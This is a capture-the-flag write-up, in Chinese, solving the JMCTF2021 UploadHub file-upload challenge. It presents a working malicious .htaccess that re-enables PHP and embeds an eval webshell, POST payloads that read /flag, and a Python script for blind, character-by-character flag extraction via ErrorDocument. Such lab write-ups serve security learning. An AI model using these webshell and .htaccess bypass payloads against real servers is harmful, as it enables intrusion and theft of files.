---
title: JMCTF2021-UploadHub
date: 2025-12-11 21:28:00
tags:
- upload
- .htaccess利用
- 绕过php_flag engine off
category:
- 刷题笔记
---

# JMCTF2021-UploadHub

打开靶机发现是个upload表单。下载源码

发现没有任何上传限制，但是上传上去的木马无法正常被解析

先查看apache2.conf配置文件：

```
<Directory ~ "/var/www/html/upload/[a-f0-9]{32}/">
        php_flag engine off
</Directory>
```

解析：

- **`<Directory>`**：Apache目录配置指令
- **`~`**：表示使用正则表达式匹配
- **匹配模式**：`"/var/www/html/upload/[a-f0-9]{32}/"`
  - `/var/www/html/upload/`：基础上传目录
  - `[a-f0-9]{32}`：32位的十六进制字符串（小写a-f和数字0-9）
  - `/`：末尾斜杠表示这是一个目录

关键：

```
 php_flag engine off
```

这会让在正则匹配表达式的目录中完全禁用PHP执行

## 解法一 .htaccess利用

.htaccess是可以修改配置的文件，正好这题不做上传限制

.htaccess

```
<FilesMatch .htaccess>
SetHandler application/x-httpd-php 
Require all granted  
php_flag engine on	
</FilesMatch>

php_value auto_prepend_file .htaccess
#<?php eval($_POST[1]);?>
```

解析：

**SetHandler和ForceType**

强制所有匹配的文件被一个指定的处理器处理 用法：

```
ForceType application/x-httpd-php
SetHandler application/x-httpd-php
```

这里就是将.htaccess文件解析为php

```
Require all granted  #允许所有请求
```

```
php_flag engine on   #开启PHP的解析
```

```
php_value auto_prepend_file .htaccess 在主文件解析之前自动解析包含.htaccess的内容
```

---

上传构造好的.htaccess，然后查看网页源码发现上传后的文件地址

```
<img src='upload/ee1a855d61faa5cb274d982f99f2b440/.htaccess'/><style>
      body{
   background:url(./back.jpg)  no-repeat right -160px  ;
   background-size:90%;
   background-attachment:fixed;
  background-color: rgba(255, 255, 255, 0.8);
}
```

跟进上传后的文件查看源码发现webshell成功解析

```

<FilesMatch .htaccess>
SetHandler application/x-httpd-php 
Require all granted  
php_flag engine on	
</FilesMatch>

php_value auto_prepend_file .htaccess
#<FilesMatch .htaccess>
SetHandler application/x-httpd-php 
Require all granted  
php_flag engine on	
</FilesMatch>

php_value auto_prepend_file .htaccess
#
```

然后尝试运行命令

```
/upload/ee1a855d61faa5cb274d982f99f2b440/.htaccess

post:
1=phpinfo();
```

成功运行phpinfo，然后发现过滤了很多命令执行函数，例如system

这里使用file_get_contents读取flag

payload：

```
1=var_dump(scandir("/"));

1=var_dump(file_get_contents("/flag"));
或者	
1=echo file_get_contents('/flag');
```

---

## 解法二 盲注ErrorDocument 404

传.htaccess文件，但内容不一样：

```
<If "file('/flag')=~ '/flag{/'">
ErrorDocument 404 "wupco"
</If>
```

`~` ：用于开启“正则表达式”分析，正则表达式必须在**双引号**之间。

如果匹配到就设置ErrorDocument 404为"wupco"，那么访问一个不存在的页面时就会显示`wupco`这个字符串

脚本：

```
import requests
import string
import hashlib
ip = '74310c5695d734e667dc2250a05dcd29'//修改成自己的
print(ip)

def check(a):
    htaccess = '''
    <If "file('/flag')=~ /'''+a+'''/">
    ErrorDocument 404 "wupco6"
    </If>
    '''
    resp = requests.post("http://ec19713a-672c-4509-bc22-545487f35622.node3.buuoj.cn/index.php?id=69660",data={'submit': 'submit'}, files={'file': ('.htaccess',htaccess)} )
    a = requests.get("http://ec19713a-672c-4509-bc22-545487f35622.node3.buuoj.cn/upload/"+ip+"/a").text

    if "wupco" not in a:
        return False
    else:
        print(a)
        return True
flag = "flag{"
check(flag)

c = string.ascii_letters + string.digits + "\{\}"
for j in range(32):
    for i in c:
        print("checking: "+ flag+i)
        if check(flag+i):
            flag = flag+i
            print(flag)
            break
        else:
            continue

```





































